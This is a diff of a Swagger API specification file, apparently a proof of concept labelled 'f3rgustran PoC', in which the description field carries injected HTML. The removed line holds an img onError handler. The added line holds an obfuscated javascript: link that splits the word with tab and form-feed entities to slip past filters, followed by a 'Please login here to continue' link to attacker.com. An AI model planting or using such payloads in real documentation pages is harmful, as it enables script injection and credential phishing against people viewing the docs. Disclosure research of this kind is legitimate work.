@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    Hi, f3rgustran PoC<br><img src=1 onError=aaa(1)><a href='https://attacker.com/'><br>Please login here to continue</a>
+    Hi, f3rgustran PoC<br><form/action=x><a href=&#12;ja&#09;vas&#09;cr&#09;ipt:print() \><a href='https://attacker.com/'><br>Please login here to continue</a>
 
   version: production
 basePath: /JSSResource/
